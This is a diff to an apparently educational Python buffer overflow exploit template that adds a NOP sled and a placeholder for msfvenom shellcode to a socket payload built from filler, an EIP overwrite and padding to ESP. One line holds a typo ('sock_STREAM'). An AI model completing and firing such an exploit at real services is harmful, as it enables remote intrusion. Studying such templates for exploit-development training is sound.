@@ -12,7 +12,8 @@ filler_to_EIP = "A" * [input length outputed by msf-pattern_offset]
 EIP = [little endian hexcode static memory address]
 ## Enter the amount of byte space that seperates EIP and ESP.
 EIP_to_ESP = "C" * [byte space between EIP and ESP]
-new_buffer = "D" * 500
+nops = "\x90" * 20
+shellcode = ("[shellcode from msfvenom]")
 
 # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
 try:
@@ -22,7 +23,7 @@ try:
   # Initialize and send input_buffer variable fuzzing data through the socket to the target host.
   s = socket.socket (socket.AF_INET, socket.sock_STREAM)
   s.connect((target_IP, target_port))
-  s.send(filler_to_EIP + EIP + EIP_to_ESP + new_buffer)
+  s.send(filler_to_EIP + EIP + EIP_to_ESP + nops + shellcode)
   s.close()
     
   # Print confirmation after a full socket creation, data sending, and tear down successfully occurs.
